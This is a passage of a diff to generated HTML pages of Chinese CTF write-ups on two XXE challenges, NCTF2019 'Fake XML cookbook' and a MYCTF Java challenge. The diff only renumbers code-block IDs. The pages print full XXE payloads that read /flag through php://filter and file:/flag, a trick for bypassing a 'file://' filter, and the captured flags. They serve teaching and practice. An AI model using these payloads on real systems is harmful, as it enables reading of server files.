+</span><span id="__span-24-16"><a id="__codelineno-24-16" name="__codelineno-24-16" href="#__codelineno-24-16"></a><span class="x">        $result = sprintf("&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;", 1, $username);</span>
+</span><span id="__span-24-17"><a id="__codelineno-24-17" name="__codelineno-24-17" href="#__codelineno-24-17"></a><span class="x">    } else {</span>
+</span><span id="__span-24-18"><a id="__codelineno-24-18" name="__codelineno-24-18" href="#__codelineno-24-18"></a><span class="x">        $result = sprintf("&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;", 0, $username);</span>
+</span><span id="__span-24-19"><a id="__codelineno-24-19" name="__codelineno-24-19" href="#__codelineno-24-19"></a><span class="x">    }</span>
+</span><span id="__span-24-20"><a id="__codelineno-24-20" name="__codelineno-24-20" href="#__codelineno-24-20"></a><span class="x">} catch (Exception $e) {</span>
+</span><span id="__span-24-21"><a id="__codelineno-24-21" name="__codelineno-24-21" href="#__codelineno-24-21"></a><span class="x">    $result = sprintf("&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;", 3, $e-&gt;getMessage());</span>
+</span><span id="__span-24-22"><a id="__codelineno-24-22" name="__codelineno-24-22" href="#__codelineno-24-22"></a><span class="x">}</span>
 </span></code></pre></div>
 <p><strong>两个关键配置：</strong></p>
-<div class="language-php highlight"><pre><span></span><code><span id="__span-35-1"><a id="__codelineno-35-1" name="__codelineno-35-1" href="#__codelineno-35-1"></a><span class="x">libxml_disable_entity_loader(false);   // 允许加载外部实体</span>
-</span><span id="__span-35-2"><a id="__codelineno-35-2" name="__codelineno-35-2" href="#__codelineno-35-2"></a><span class="x">LIBXML_NOENT | LIBXML_DTDLOAD          // 替换实体 + 加载 DTD</span>
+<div class="language-php highlight"><pre><span></span><code><span id="__span-25-1"><a id="__codelineno-25-1" name="__codelineno-25-1" href="#__codelineno-25-1"></a><span class="x">libxml_disable_entity_loader(false);   // 允许加载外部实体</span>
+</span><span id="__span-25-2"><a id="__codelineno-25-2" name="__codelineno-25-2" href="#__codelineno-25-2"></a><span class="x">LIBXML_NOENT | LIBXML_DTDLOAD          // 替换实体 + 加载 DTD</span>
 </span></code></pre></div>
 <p><strong>这就是漏洞的根源。</strong></p>
 <h4 id="step-4"><a class="toclink" href="../../nctf2019-fake-xml-cookbook/#step-4">Step 4：账号密码是假的线索</a></h4>
@@ -3712,14 +3897,14 @@
 <p><strong>所以这条路走完就丢掉，别在登录上耗时间。</strong></p>
 <h4 id="step-5-flag"><a class="toclink" href="../../nctf2019-fake-xml-cookbook/#step-5-flag">Step 5：直接读 flag</a></h4>
 <p><strong>把 <code>resource=</code> 换成 flag 文件即可：</strong></p>
-<div class="language-xml highlight"><pre><span></span><code><span id="__span-36-1"><a id="__codelineno-36-1" name="__codelineno-36-1" href="#__codelineno-36-1"></a><span class="cp">&lt;!DOCTYPE user [ &lt;!ENTITY x SYSTEM "php://filter/read=convert.base64-encode/resource=/flag"&gt;</span><span class="w"> </span>]&gt;
-</span><span id="__span-36-2"><a id="__codelineno-36-2" name="__codelineno-36-2" href="#__codelineno-36-2"></a><span class="nt">&lt;user&gt;</span>
-</span><span id="__span-36-3"><a id="__codelineno-36-3" name="__codelineno-36-3" href="#__codelineno-36-3"></a><span class="w">  </span><span class="nt">&lt;username&gt;</span><span class="ni">&amp;x;</span><span class="nt">&lt;/username&gt;</span>
-</span><span id="__span-36-4"><a id="__codelineno-36-4" name="__codelineno-36-4" href="#__codelineno-36-4"></a><span class="w">  </span><span class="nt">&lt;password&gt;</span>1<span class="nt">&lt;/password&gt;</span>
-</span><span id="__span-36-5"><a id="__codelineno-36-5" name="__codelineno-36-5" href="#__codelineno-36-5"></a><span class="nt">&lt;/user&gt;</span>
+<div class="language-xml highlight"><pre><span></span><code><span id="__span-26-1"><a id="__codelineno-26-1" name="__codelineno-26-1" href="#__codelineno-26-1"></a><span class="cp">&lt;!DOCTYPE user [ &lt;!ENTITY x SYSTEM "php://filter/read=convert.base64-encode/resource=/flag"&gt;</span><span class="w"> </span>]&gt;
+</span><span id="__span-26-2"><a id="__codelineno-26-2" name="__codelineno-26-2" href="#__codelineno-26-2"></a><span class="nt">&lt;user&gt;</span>
+</span><span id="__span-26-3"><a id="__codelineno-26-3" name="__codelineno-26-3" href="#__codelineno-26-3"></a><span class="w">  </span><span class="nt">&lt;username&gt;</span><span class="ni">&amp;x;</span><span class="nt">&lt;/username&gt;</span>
+</span><span id="__span-26-4"><a id="__codelineno-26-4" name="__codelineno-26-4" href="#__codelineno-26-4"></a><span class="w">  </span><span class="nt">&lt;password&gt;</span>1<span class="nt">&lt;/password&gt;</span>
+</span><span id="__span-26-5"><a id="__codelineno-26-5" name="__codelineno-26-5" href="#__codelineno-26-5"></a><span class="nt">&lt;/user&gt;</span>
 </span></code></pre></div>
 <p><strong>base64 解码：</strong></p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-37-1"><a id="__codelineno-37-1" name="__codelineno-37-1" href="#__codelineno-37-1"></a>CTF2{72a5521b-e903-46b6-a937-056b82c51205}
+<div class="language-text highlight"><pre><span></span><code><span id="__span-27-1"><a id="__codelineno-27-1" name="__codelineno-27-1" href="#__codelineno-27-1"></a>CTF2{72a5521b-e903-46b6-a937-056b82c51205}
 </span></code></pre></div>
 <p><strong>如果 flag 文件里都是纯文本、没有 <code>&lt;</code>，也可以直接 <code>SYSTEM "file:///flag"</code>，省掉编码这一步。</strong></p>
 <hr />
@@ -3760,14 +3945,14 @@
 <hr />
 <details class="note">
 <summary>完整 payload</summary>
-<div class="language-xml highlight"><pre><span></span><code><span id="__span-38-1"><a id="__codelineno-38-1" name="__codelineno-38-1" href="#__codelineno-38-1"></a><span class="cp">&lt;!DOCTYPE user [ &lt;!ENTITY x SYSTEM "php://filter/read=convert.base64-encode/resource=/flag"&gt;</span><span class="w"> </span>]&gt;
-</span><span id="__span-38-2"><a id="__codelineno-38-2" name="__codelineno-38-2" href="#__codelineno-38-2"></a><span class="nt">&lt;user&gt;</span>
-</span><span id="__span-38-3"><a id="__codelineno-38-3" name="__codelineno-38-3" href="#__codelineno-38-3"></a><span class="w">  </span><span class="nt">&lt;username&gt;</span><span class="ni">&amp;x;</span><span class="nt">&lt;/username&gt;</span>
-</span><span id="__span-38-4"><a id="__codelineno-38-4" name="__codelineno-38-4" href="#__codelineno-38-4"></a><span class="w">  </span><span class="nt">&lt;password&gt;</span>1<span class="nt">&lt;/password&gt;</span>
-</span><span id="__span-38-5"><a id="__codelineno-38-5" name="__codelineno-38-5" href="#__codelineno-38-5"></a><span class="nt">&lt;/user&gt;</span>
+<div class="language-xml highlight"><pre><span></span><code><span id="__span-28-1"><a id="__codelineno-28-1" name="__codelineno-28-1" href="#__codelineno-28-1"></a><span class="cp">&lt;!DOCTYPE user [ &lt;!ENTITY x SYSTEM "php://filter/read=convert.base64-encode/resource=/flag"&gt;</span><span class="w"> </span>]&gt;
+</span><span id="__span-28-2"><a id="__codelineno-28-2" name="__codelineno-28-2" href="#__codelineno-28-2"></a><span class="nt">&lt;user&gt;</span>
+</span><span id="__span-28-3"><a id="__codelineno-28-3" name="__codelineno-28-3" href="#__codelineno-28-3"></a><span class="w">  </span><span class="nt">&lt;username&gt;</span><span class="ni">&amp;x;</span><span class="nt">&lt;/username&gt;</span>
+</span><span id="__span-28-4"><a id="__codelineno-28-4" name="__codelineno-28-4" href="#__codelineno-28-4"></a><span class="w">  </span><span class="nt">&lt;password&gt;</span>1<span class="nt">&lt;/password&gt;</span>
+</span><span id="__span-28-5"><a id="__codelineno-28-5" name="__codelineno-28-5" href="#__codelineno-28-5"></a><span class="nt">&lt;/user&gt;</span>
 </span></code></pre></div>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-39-1"><a id="__codelineno-39-1" name="__codelineno-39-1" href="#__codelineno-39-1"></a>POST /doLogin.php
-</span><span id="__span-39-2"><a id="__codelineno-39-2" name="__codelineno-39-2" href="#__codelineno-39-2"></a>Content-Type: application/xml
+<div class="language-text highlight"><pre><span></span><code><span id="__span-29-1"><a id="__codelineno-29-1" name="__codelineno-29-1" href="#__codelineno-29-1"></a>POST /doLogin.php
+</span><span id="__span-29-2"><a id="__codelineno-29-2" name="__codelineno-29-2" href="#__codelineno-29-2"></a>Content-Type: application/xml
 </span></code></pre></div>
 </details>
 <details class="note">
@@ -4375,9 +4560,9 @@
 <hr />
 <h3 id="_1"><a class="toclink" href="../../myctf-xxe-shi-jian/#_1">题目概述</a></h3>
 <p>题目背景写得很讲究：</p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-27-1"><a id="__codelineno-27-1" name="__codelineno-27-1" href="#__codelineno-27-1"></a>诗笺不再手书，改以 XML 书就，交誊录官代为誊抄入册。
-</span><span id="__span-27-2"><a id="__codelineno-27-2" name="__codelineno-27-2" href="#__codelineno-27-2"></a>誊录官是个实诚人：笺上写什么，他便抄什么，一字不改。
-</span><span id="__span-27-3"><a id="__codelineno-27-3" name="__codelineno-27-3" href="#__codelineno-27-3"></a>听新闻社中那面小旗，就压在誊录官的案头（/flag）。
+<div class="language-text highlight"><pre><span></span><code><span id="__span-18-1"><a id="__codelineno-18-1" name="__codelineno-18-1" href="#__codelineno-18-1"></a>诗笺不再手书，改以 XML 书就，交誊录官代为誊抄入册。
+</span><span id="__span-18-2"><a id="__codelineno-18-2" name="__codelineno-18-2" href="#__codelineno-18-2"></a>誊录官是个实诚人：笺上写什么，他便抄什么，一字不改。
+</span><span id="__span-18-3"><a id="__codelineno-18-3" name="__codelineno-18-3" href="#__codelineno-18-3"></a>听新闻社中那面小旗，就压在誊录官的案头（/flag）。
 </span></code></pre></div>
 <p><strong>“笺上写什么就抄什么，一字不改”——这就是在告诉你：服务器会</strong>原样解析并回显<strong>你提交的 XML。</strong></p>
 <p><strong>而那面小旗（flag）就在它案头，也就是 <code>/flag</code> 文件。</strong></p>
@@ -4386,64 +4571,64 @@
 <h3 id="_2"><a class="toclink" href="../../myctf-xxe-shi-jian/#_2">解题过程</a></h3>
 <h4 id="step-1-js"><a class="toclink" href="../../myctf-xxe-shi-jian/#step-1-js">Step 1：先看 JS，找到提交入口</a></h4>
 <p><strong>页面里有个输入框，但按钮背后才是关键。翻页面源码里的脚本：</strong></p>
-<div class="language-javascript highlight"><pre><span></span><code><span id="__span-28-1"><a id="__codelineno-28-1" name="__codelineno-28-1" href="#__codelineno-28-1"></a><span class="k">try</span><span class="w"> </span><span class="p">{</span>
-</span><span id="__span-28-2"><a id="__codelineno-28-2" name="__codelineno-28-2" href="#__codelineno-28-2"></a><span class="w">  </span><span class="kd">const</span><span class="w"> </span><span class="nx">r</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">await</span><span class="w"> </span><span class="nx">fetch</span><span class="p">(</span><span class="s1">'/tengchao'</span><span class="p">,</span><span class="w"> </span><span class="p">{</span>
-</span><span id="__span-28-3"><a id="__codelineno-28-3" name="__codelineno-28-3" href="#__codelineno-28-3"></a><span class="w">    </span><span class="nx">method</span><span class="o">:</span><span class="w"> </span><span class="s1">'POST'</span><span class="p">,</span>
-</span><span id="__span-28-4"><a id="__codelineno-28-4" name="__codelineno-28-4" href="#__codelineno-28-4"></a><span class="w">    </span><span class="nx">headers</span><span class="o">:</span><span class="w"> </span><span class="p">{</span><span class="s1">'Content-Type'</span><span class="o">:</span><span class="w"> </span><span class="s1">'application/xml'</span><span class="p">},</span>
-</span><span id="__span-28-5"><a id="__codelineno-28-5" name="__codelineno-28-5" href="#__codelineno-28-5"></a><span class="w">    </span><span class="nx">body</span><span class="o">:</span><span class="w"> </span><span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="s1">'x'</span><span class="p">).</span><span class="nx">value</span>
-</span><span id="__span-28-6"><a id="__codelineno-28-6" name="__codelineno-28-6" href="#__codelineno-28-6"></a><span class="w">  </span><span class="p">})</span>
+<div class="language-javascript highlight"><pre><span></span><code><span id="__span-19-1"><a id="__codelineno-19-1" name="__codelineno-19-1" href="#__codelineno-19-1"></a><span class="k">try</span><span class="w"> </span><span class="p">{</span>
+</span><span id="__span-19-2"><a id="__codelineno-19-2" name="__codelineno-19-2" href="#__codelineno-19-2"></a><span class="w">  </span><span class="kd">const</span><span class="w"> </span><span class="nx">r</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">await</span><span class="w"> </span><span class="nx">fetch</span><span class="p">(</span><span class="s1">'/tengchao'</span><span class="p">,</span><span class="w"> </span><span class="p">{</span>
+</span><span id="__span-19-3"><a id="__codelineno-19-3" name="__codelineno-19-3" href="#__codelineno-19-3"></a><span class="w">    </span><span class="nx">method</span><span class="o">:</span><span class="w"> </span><span class="s1">'POST'</span><span class="p">,</span>
+</span><span id="__span-19-4"><a id="__codelineno-19-4" name="__codelineno-19-4" href="#__codelineno-19-4"></a><span class="w">    </span><span class="nx">headers</span><span class="o">:</span><span class="w"> </span><span class="p">{</span><span class="s1">'Content-Type'</span><span class="o">:</span><span class="w"> </span><span class="s1">'application/xml'</span><span class="p">},</span>
+</span><span id="__span-19-5"><a id="__codelineno-19-5" name="__codelineno-19-5" href="#__codelineno-19-5"></a><span class="w">    </span><span class="nx">body</span><span class="o">:</span><span class="w"> </span><span class="nb">document</span><span class="p">.</span><span class="nx">getElementById</span><span class="p">(</span><span class="s1">'x'</span><span class="p">).</span><span class="nx">value</span>
+</span><span id="__span-19-6"><a id="__codelineno-19-6" name="__codelineno-19-6" href="#__codelineno-19-6"></a><span class="w">  </span><span class="p">})</span>
 </span></code></pre></div>
 <p><strong>三件事一眼看清：</strong></p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-29-1"><a id="__codelineno-29-1" name="__codelineno-29-1" href="#__codelineno-29-1"></a>接口      POST /tengchao
-</span><span id="__span-29-2"><a id="__codelineno-29-2" name="__codelineno-29-2" href="#__codelineno-29-2"></a>类型      application/xml
-</span><span id="__span-29-3"><a id="__codelineno-29-3" name="__codelineno-29-3" href="#__codelineno-29-3"></a>请求体    输入框 #x 里的全部内容，原样提交
+<div class="language-text highlight"><pre><span></span><code><span id="__span-20-1"><a id="__codelineno-20-1" name="__codelineno-20-1" href="#__codelineno-20-1"></a>接口      POST /tengchao
+</span><span id="__span-20-2"><a id="__codelineno-20-2" name="__codelineno-20-2" href="#__codelineno-20-2"></a>类型      application/xml
+</span><span id="__span-20-3"><a id="__codelineno-20-3" name="__codelineno-20-3" href="#__codelineno-20-3"></a>请求体    输入框 #x 里的全部内容，原样提交
 </span></code></pre></div>
 <p><strong>也就是说：输入框里写什么 XML，服务器就拿什么去解析。</strong></p>
 <h4 id="step-2"><a class="toclink" href="../../myctf-xxe-shi-jian/#step-2">Step 2：先确认后端语言（这一步很重要）</a></h4>
 <p><strong>我第一反应是 PHP 环境，于是去试 <code>php://filter</code>。</strong></p>
 <p><strong>结果报错里的堆栈信息显示是</strong>Java<strong>。</strong></p>
 <p><strong>这一步的价值：</strong></p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-30-1"><a id="__codelineno-30-1" name="__codelineno-30-1" href="#__codelineno-30-1"></a>报错暴露语言 → 决定用哪套绕过思路
-</span><span id="__span-30-2"><a id="__codelineno-30-2" name="__codelineno-30-2" href="#__codelineno-30-2"></a>PHP  的伪协议        php://filter、php://input
-</span><span id="__span-30-3"><a id="__codelineno-30-3" name="__codelineno-30-3" href="#__codelineno-30-3"></a>Java 的 XML 解析     URI 处理更宽松，过滤常常形同虚设
+<div class="language-text highlight"><pre><span></span><code><span id="__span-21-1"><a id="__codelineno-21-1" name="__codelineno-21-1" href="#__codelineno-21-1"></a>报错暴露语言 → 决定用哪套绕过思路
+</span><span id="__span-21-2"><a id="__codelineno-21-2" name="__codelineno-21-2" href="#__codelineno-21-2"></a>PHP  的伪协议        php://filter、php://input
+</span><span id="__span-21-3"><a id="__codelineno-21-3" name="__codelineno-21-3" href="#__codelineno-21-3"></a>Java 的 XML 解析     URI 处理更宽松，过滤常常形同虚设
 </span></code></pre></div>
 <p><strong>很多时候“过滤能不能绕”不取决于过滤写得严不严，而取决于</strong>解析器是谁<strong>。</strong></p>
 <h4 id="step-3file-java"><a class="toclink" href="../../myctf-xxe-shi-jian/#step-3file-java">Step 3：<code>file://</code> 被过滤，但 Java 不认这个死理</a></h4>
 <p><strong>直接写 <code>file:///flag</code>，被拦了——代码里过滤了 <code>file://</code> 这个字符串。</strong></p>
 <p><strong>但 Java 的 XML 解析器在解析 <code>SYSTEM</code> 后面的值时，是按 <strong>URI</strong> 处理的，对斜杠数量并不敏感：</strong></p>
-<div class="language-xml highlight"><pre><span></span><code><span id="__span-31-1"><a id="__codelineno-31-1" name="__codelineno-31-1" href="#__codelineno-31-1"></a>SYSTEM<span class="w"> </span>"file:///flag"<span class="w">    </span>←<span class="w"> </span>被过滤
-</span><span id="__span-31-2"><a id="__codelineno-31-2" name="__codelineno-31-2" href="#__codelineno-31-2"></a>SYSTEM<span class="w"> </span>"file:/flag"<span class="w">      </span>←<span class="w"> </span>只有一个斜杠，能过
-</span><span id="__span-31-3"><a id="__codelineno-31-3" name="__codelineno-31-3" href="#__codelineno-31-3"></a>SYSTEM<span class="w"> </span>"/flag"<span class="w">           </span>←<span class="w"> </span>干脆不带协议，也能过（当作绝对路径）
+<div class="language-xml highlight"><pre><span></span><code><span id="__span-22-1"><a id="__codelineno-22-1" name="__codelineno-22-1" href="#__codelineno-22-1"></a>SYSTEM<span class="w"> </span>"file:///flag"<span class="w">    </span>←<span class="w"> </span>被过滤
+</span><span id="__span-22-2"><a id="__codelineno-22-2" name="__codelineno-22-2" href="#__codelineno-22-2"></a>SYSTEM<span class="w"> </span>"file:/flag"<span class="w">      </span>←<span class="w"> </span>只有一个斜杠，能过
+</span><span id="__span-22-3"><a id="__codelineno-22-3" name="__codelineno-22-3" href="#__codelineno-22-3"></a>SYSTEM<span class="w"> </span>"/flag"<span class="w">           </span>←<span class="w"> </span>干脆不带协议，也能过（当作绝对路径）
 </span></code></pre></div>
 <p><strong>所以这里不是“绕过过滤技巧”，是“过滤器假设错了写法”。</strong>它以为外部实体只有 <code>file://</code> 一种形态。</p>
 <h4 id="step-4-payload"><a class="toclink" href="../../myctf-xxe-shi-jian/#step-4-payload">Step 4：写 payload</a></h4>
-<div class="language-xml highlight"><pre><span></span><code><span id="__span-32-1"><a id="__codelineno-32-1" name="__codelineno-32-1" href="#__codelineno-32-1"></a><span class="cp">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span>
-</span><span id="__span-32-2"><a id="__codelineno-32-2" name="__codelineno-32-2" href="#__codelineno-32-2"></a><span class="cp">&lt;!DOCTYPE 诗筏 [ &lt;!ENTITY x SYSTEM "file:/flag"&gt;</span><span class="w"> </span>]&gt;
-</span><span id="__span-32-3"><a id="__codelineno-32-3" name="__codelineno-32-3" href="#__codelineno-32-3"></a><span class="nt">&lt;诗筏&gt;</span>
-</span><span id="__span-32-4"><a id="__codelineno-32-4" name="__codelineno-32-4" href="#__codelineno-32-4"></a><span class="w">  </span><span class="nt">&lt;题名&gt;</span><span class="ni">&amp;x;</span><span class="nt">&lt;/题名&gt;</span>
-</span><span id="__span-32-5"><a id="__codelineno-32-5" name="__codelineno-32-5" href="#__codelineno-32-5"></a><span class="w">  </span><span class="nt">&lt;落款&gt;&lt;/落款&gt;</span>
-</span><span id="__span-32-6"><a id="__codelineno-32-6" name="__codelineno-32-6" href="#__codelineno-32-6"></a><span class="w">  </span><span class="nt">&lt;句&gt;</span>出浴太真冰作影<span class="nt">&lt;/句&gt;</span>
-</span><span id="__span-32-7"><a id="__codelineno-32-7" name="__codelineno-32-7" href="#__codelineno-32-7"></a><span class="w">  </span><span class="nt">&lt;句&gt;</span>捧心西子玉为魂<span class="nt">&lt;/句&gt;</span>
-</span><span id="__span-32-8"><a id="__codelineno-32-8" name="__codelineno-32-8" href="#__codelineno-32-8"></a><span class="nt">&lt;/诗筏&gt;</span>
+<div class="language-xml highlight"><pre><span></span><code><span id="__span-23-1"><a id="__codelineno-23-1" name="__codelineno-23-1" href="#__codelineno-23-1"></a><span class="cp">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span>
+</span><span id="__span-23-2"><a id="__codelineno-23-2" name="__codelineno-23-2" href="#__codelineno-23-2"></a><span class="cp">&lt;!DOCTYPE 诗筏 [ &lt;!ENTITY x SYSTEM "file:/flag"&gt;</span><span class="w"> </span>]&gt;
+</span><span id="__span-23-3"><a id="__codelineno-23-3" name="__codelineno-23-3" href="#__codelineno-23-3"></a><span class="nt">&lt;诗筏&gt;</span>
+</span><span id="__span-23-4"><a id="__codelineno-23-4" name="__codelineno-23-4" href="#__codelineno-23-4"></a><span class="w">  </span><span class="nt">&lt;题名&gt;</span><span class="ni">&amp;x;</span><span class="nt">&lt;/题名&gt;</span>
+</span><span id="__span-23-5"><a id="__codelineno-23-5" name="__codelineno-23-5" href="#__codelineno-23-5"></a><span class="w">  </span><span class="nt">&lt;落款&gt;&lt;/落款&gt;</span>
+</span><span id="__span-23-6"><a id="__codelineno-23-6" name="__codelineno-23-6" href="#__codelineno-23-6"></a><span class="w">  </span><span class="nt">&lt;句&gt;</span>出浴太真冰作影<span class="nt">&lt;/句&gt;</span>
+</span><span id="__span-23-7"><a id="__codelineno-23-7" name="__codelineno-23-7" href="#__codelineno-23-7"></a><span class="w">  </span><span class="nt">&lt;句&gt;</span>捧心西子玉为魂<span class="nt">&lt;/句&gt;</span>
+</span><span id="__span-23-8"><a id="__codelineno-23-8" name="__codelineno-23-8" href="#__codelineno-23-8"></a><span class="nt">&lt;/诗筏&gt;</span>
 </span></code></pre></div>
 <p><strong>三部分缺一不可：</strong></p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-33-1"><a id="__codelineno-33-1" name="__codelineno-33-1" href="#__codelineno-33-1"></a>① &lt;!DOCTYPE ... [ &lt;!ENTITY x SYSTEM "file:/flag"&gt; ]&gt;
-</span><span id="__span-33-2"><a id="__codelineno-33-2" name="__codelineno-33-2" href="#__codelineno-33-2"></a>   在 DTD 里声明一个实体 x，内容来自 file:/flag
-</span><span id="__span-33-3"><a id="__codelineno-33-3" name="__codelineno-33-3" href="#__codelineno-33-3"></a>
-</span><span id="__span-33-4"><a id="__codelineno-33-4" name="__codelineno-33-4" href="#__codelineno-33-4"></a>② &lt;题名&gt;&amp;x;&lt;/题名&gt;
-</span><span id="__span-33-5"><a id="__codelineno-33-5" name="__codelineno-33-5" href="#__codelineno-33-5"></a>   在正文里**引用**它 —— 不引用，解析器根本不会去读文件
-</span><span id="__span-33-6"><a id="__codelineno-33-6" name="__codelineno-33-6" href="#__codelineno-33-6"></a>
-</span><span id="__span-33-7"><a id="__codelineno-33-7" name="__codelineno-33-7" href="#__codelineno-33-7"></a>③ 保留原有的结构
-</span><span id="__span-33-8"><a id="__codelineno-33-8" name="__codelineno-33-8" href="#__codelineno-33-8"></a>   服务器要按模板把内容抄进“誊抄入册”，结构不对就走不到回显
+<div class="language-text highlight"><pre><span></span><code><span id="__span-24-1"><a id="__codelineno-24-1" name="__codelineno-24-1" href="#__codelineno-24-1"></a>① &lt;!DOCTYPE ... [ &lt;!ENTITY x SYSTEM "file:/flag"&gt; ]&gt;
+</span><span id="__span-24-2"><a id="__codelineno-24-2" name="__codelineno-24-2" href="#__codelineno-24-2"></a>   在 DTD 里声明一个实体 x，内容来自 file:/flag
+</span><span id="__span-24-3"><a id="__codelineno-24-3" name="__codelineno-24-3" href="#__codelineno-24-3"></a>
+</span><span id="__span-24-4"><a id="__codelineno-24-4" name="__codelineno-24-4" href="#__codelineno-24-4"></a>② &lt;题名&gt;&amp;x;&lt;/题名&gt;
+</span><span id="__span-24-5"><a id="__codelineno-24-5" name="__codelineno-24-5" href="#__codelineno-24-5"></a>   在正文里**引用**它 —— 不引用，解析器根本不会去读文件
+</span><span id="__span-24-6"><a id="__codelineno-24-6" name="__codelineno-24-6" href="#__codelineno-24-6"></a>
+</span><span id="__span-24-7"><a id="__codelineno-24-7" name="__codelineno-24-7" href="#__codelineno-24-7"></a>③ 保留原有的结构
+</span><span id="__span-24-8"><a id="__codelineno-24-8" name="__codelineno-24-8" href="#__codelineno-24-8"></a>   服务器要按模板把内容抄进“誊抄入册”，结构不对就走不到回显
 </span></code></pre></div>
 <p><strong>最容易漏的是第 ②：</strong>只声明实体、不引用，服务器什么都不会给你。**</p>
 <h4 id="step-5"><a class="toclink" href="../../myctf-xxe-shi-jian/#step-5">Step 5：提交，读结果</a></h4>
 <p><strong>把整段 XML 填进输入框，点提交。</strong></p>
 <p><strong>“誊抄入册”那块原样回显了：</strong></p>
-<div class="language-text highlight"><pre><span></span><code><span id="__span-34-1"><a id="__codelineno-34-1" name="__codelineno-34-1" href="#__codelineno-34-1"></a>题名：MYCTF{174907b1-c480-4128-83e2-efcb839b4b33}
-</span><span id="__span-34-2"><a id="__codelineno-34-2" name="__codelineno-34-2" href="#__codelineno-34-2"></a>落款：
-</span><span id="__span-34-3"><a id="__codelineno-34-3" name="__codelineno-34-3" href="#__codelineno-34-3"></a>出浴太真冰作影
-</span><span id="__span-34-4"><a id="__codelineno-34-4" name="__codelineno-34-4" href="#__codelineno-34-4"></a>捧心西子玉为魂
+<div class="language-text highlight"><pre><span></span><code><span id="__span-25-1"><a id="__codelineno-25-1" name="__codelineno-25-1" href="#__codelineno-25-1"></a>题名：MYCTF{174907b1-c480-4128-83e2-efcb839b4b33}
+</span><span id="__span-25-2"><a id="__codelineno-25-2" name="__codelineno-25-2" href="#__codelineno-25-2"></a>落款：
+</span><span id="__span-25-3"><a id="__codelineno-25-3" name="__codelineno-25-3" href="#__codelineno-25-3"></a>出浴太真冰作影
+</span><span id="__span-25-4"><a id="__codelineno-25-4" name="__codelineno-25-4" href="#__codelineno-25-4"></a>捧心西子玉为魂
 </span></code></pre></div>
 <p><strong>因为 <code>&amp;x;</code> 在解析时被替换成了 <code>/flag</code> 文件的内容。</strong></p>
 <hr />
@@ -4484,14 +4669,14 @@
 <hr />
 <details class="note">
 <summary>完整 payload</summary>
-<div class="language-xml highlight"><pre><span></span><code><span id="__span-35-1"><a id="__codelineno-35-1" name="__codelineno-35-1" href="#__codelineno-35-1"></a><span class="cp">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span>
-</span><span id="__span-35-2"><a id="__codelineno-35-2" name="__codelineno-35-2" href="#__codelineno-35-2"></a><span class="cp">&lt;!DOCTYPE 诗筏 [ &lt;!ENTITY x SYSTEM "file:/flag"&gt;</span><span class="w"> </span>]&gt;
-</span><span id="__span-35-3"><a id="__codelineno-35-3" name="__codelineno-35-3" href="#__codelineno-35-3"></a><span class="nt">&lt;诗筏&gt;</span>
-</span><span id="__span-35-4"><a id="__codelineno-35-4" name="__codelineno-35-4" href="#__codelineno-35-4"></a><span class="w">  </span><span class="nt">&lt;题名&gt;</span><span class="ni">&amp;x;</span><span class="nt">&lt;/题名&gt;</span>
-</span><span id="__span-35-5"><a id="__codelineno-35-5" name="__codelineno-35-5" href="#__codelineno-35-5"></a><span class="w">  </span><span class="nt">&lt;落款&gt;&lt;/落款&gt;</span>
-</span><span id="__span-35-6"><a id="__codelineno-35-6" name="__codelineno-35-6" href="#__codelineno-35-6"></a><span class="w">  </span><span class="nt">&lt;句&gt;</span>出浴太真冰作影<span class="nt">&lt;/句&gt;</span>
-</span><span id="__span-35-7"><a id="__codelineno-35-7" name="__codelineno-35-7" href="#__codelineno-35-7"></a><span class="w">  </span><span class="nt">&lt;句&gt;</span>捧心西子玉为魂<span class="nt">&lt;/句&gt;</span>
-</span><span id="__span-35-8"><a id="__codelineno-35-8" name="__codelineno-35-8" href="#__codelineno-35-8"></a><span class="nt">&lt;/诗筏&gt;</span>
+<div class="language-xml highlight"><pre><span></span><code><span id="__span-26-1"><a id="__codelineno-26-1" name="__codelineno-26-1" href="#__codelineno-26-1"></a><span class="cp">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span>
+</span><span id="__span-26-2"><a id="__codelineno-26-2" name="__codelineno-26-2" href="#__codelineno-26-2"></a><span class="cp">&lt;!DOCTYPE 诗筏 [ &lt;!ENTITY x SYSTEM "file:/flag"&gt;</span><span class="w"> </span>]&gt;
+</span><span id="__span-26-3"><a id="__codelineno-26-3" name="__codelineno-26-3" href="#__codelineno-26-3"></a><span class="nt">&lt;诗筏&gt;</span>
+</span><span id="__span-26-4"><a id="__codelineno-26-4" name="__codelineno-26-4" href="#__codelineno-26-4"></a><span class="w">  </span><span class="nt">&lt;题名&gt;</span><span class="ni">&amp;x;</span><span class="nt">&lt;/题名&gt;</span>
+</span><span id="__span-26-5"><a id="__codelineno-26-5" name="__codelineno-26-5" href="#__codelineno-26-5"></a><span class="w">  </span><span class="nt">&lt;落款&gt;&lt;/落款&gt;</span>
+</span><span id="__span-26-6"><a id="__codelineno-26-6" name="__codelineno-26-6" href="#__codelineno-26-6"></a><span class="w">  </span><span class="nt">&lt;句&gt;</span>出浴太真冰作影<span class="nt">&lt;/句&gt;</span>
+</span><span id="__span-26-7"><a id="__codelineno-26-7" name="__codelineno-26-7" href="#__codelineno-26-7"></a><span class="w">  </span><span class="nt">&lt;句&gt;</span>捧心西子玉为魂<span class="nt">&lt;/句&gt;</span>
+</span><span id="__span-26-8"><a id="__codelineno-26-8" name="__codelineno-26-8" href="#__codelineno-26-8"></a><span class="nt">&lt;/诗筏&gt;</span>
 </span></code></pre></div>
 </details>
 <details class="note">
